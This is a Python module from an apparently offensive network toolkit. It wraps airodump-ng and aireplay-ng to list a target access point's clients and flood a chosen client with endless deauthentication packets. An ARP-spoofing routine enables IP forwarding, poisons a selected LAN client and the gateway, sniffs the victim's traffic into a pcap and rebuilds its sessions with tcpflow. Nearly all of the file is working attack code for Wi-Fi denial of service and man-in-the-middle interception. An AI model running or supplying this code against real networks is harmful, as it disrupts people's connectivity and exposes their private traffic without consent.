'''
    <https://github.com/davidbombal/red-python-scripts/blob/main/wifi_dos_own.py>
'''

import logging
from multiprocessing.context import Process
from typing import Union

import verboselogs

from ..utils.defaultLogBanner import log_runBanner
from ..utils.utilsFolderHelper import create_service_folder
from ..utils.utilsHelper import prompt_sudo
from ..utils.utilsProcessHelper import run_command_output_loop
from ..utils.utilsWifi import UtilsWifi


# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------
class WiFiService:

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def __init__(self):
        '''
            wifi service
        '''
        logging.log(logging.DEBUG, 'wifi-service is initiated')


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def get_clients(self, hackbssid, hackchannel, wifi_name):
        run_command_output_loop(
            'get clients',
            [
                [
                    'airodump-ng',
                    '--bssid',
                    hackbssid,
                    '--channel',
                    hackchannel,
                    '-w',
                    'clients',
                    '--write-interval',
                    '1',
                    '--output-format',
                    'csv',
                    wifi_name,
                ]
            ],
        )

    def deauth_attack(self, network_mac, target_mac, interface):
        # We are using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet.
        # Then we also need to specify the interface
        run_command_output_loop(
            'deauth atack',
            [
                [
                    'aireplay-ng',
                    '--deauth',
                    '0',
                    '-a',
                    network_mac,
                    '-c',
                    target_mac,
                    interface,
                ]
            ],
        )

    def run_airmon(self, wifi_name, hackchannel):
        # Make sure that airmon-ng is running on the correct channel.
        run_command_output_loop(
            'run airmon', [["airmon-ng", "start", wifi_name, hackchannel]]
        )


    # TODO: ...
    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def scapy_arp(self, net: str):
        '''
            ...
        '''
        service_name: str = 'SCAPY_ARP'
        log_runBanner(service_name)
        path = create_service_folder(f'wifi/arp', net)
        utilsWifi: Union[UtilsWifi, None] = None
        t1: Union[Process, None] = None
        pcap_filename: Union[str, None] = None
        try:
            if not prompt_sudo():
                raise KeyboardInterrupt("not in sudo mode")

            utilsWifi = UtilsWifi()
            if not utilsWifi.validate_ip(net):
                logging.log(logging.WARNING, "No valid ip range specified")
            else:
                # If we don't run this function the internet will be down for the user.
                utilsWifi.activate_ip_forwarding()
                # Do the arp scan. The function returns a list of all clients.
                arp_res = utilsWifi.scan_arp(net)
                # If there is no connection exit the script.
                if arp_res is None or len(arp_res) == 0:
                    logging.log(
                        logging.WARNING,
                        "No connection. Exiting, make sure devices are active or turned on.",
                    )
                    raise KeyboardInterrupt("no connection")

                else:
                    # The function runs route -n command. Returns a list with the gateway in a dictionary.
                    gateways = utilsWifi.gateway_info(arp_res)
                    if gateways is None:
                        logging.log(logging.WARNING, "No gatewas found")
                        raise KeyboardInterrupt("no connection")

                    else:
                        # The gateways are removed from the clients.
                        client_info = utilsWifi.get_clients(arp_res, gateways)
                        # If there are no clients, then the program will exit from here.
                        if len(client_info) == 0:
                            logging.log(
                                logging.WARNING,
                                "No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.",
                            )
                            exit()
                        # Show the  menu and assign the choice from the function to the variable -> choice
                        choice = utilsWifi.print_arp_res(client_info)
                        # Select the node to spoof from the client_info list.
                        node_to_spoof = client_info[choice]
                        if node_to_spoof is not None and gateways is not None and gateways[
                            0
                        ] is not None:
                            # Setup the thread in the background which will send the arp spoof packets.
                            t1 = Process(
                                target=utilsWifi.send_spoof_packets,
                                args=[gateways[0], node_to_spoof],
                                daemon=True,
                            )
                            if t1 is not None:
                                # Start the thread.
                                t1.start()
                                # Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
                                pcap_filename = f'snoop_{node_to_spoof.get("ip")}'
                                utilsWifi.packet_sniffer(
                                    interface=gateways[0]["iface"],
                                    path=path,
                                    filename=pcap_filename,
                                )
        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:
            logging.log(logging.CRITICAL, e, exc_info=True)
        if pcap_filename is not None:
            run_command_output_loop(
                'pcap tcpflow',
                [['tcpflow', '-r', f'{path}/{pcap_filename}.pcap', '-o', path]],
            )
            logging.log(
                verboselogs.SUCCESS,
                f'[*] {service_name} Done! View the log reports under {path}/',
            )
        if t1 is not None:
            t1.terminate()
            logging.log(logging.INFO, 'waiting for thread ending...')
            t1.join()
            logging.log(logging.INFO, '... thread finish, ending rest...')
        if utilsWifi is not None:
            utilsWifi.deactivate_ip_forwarding()
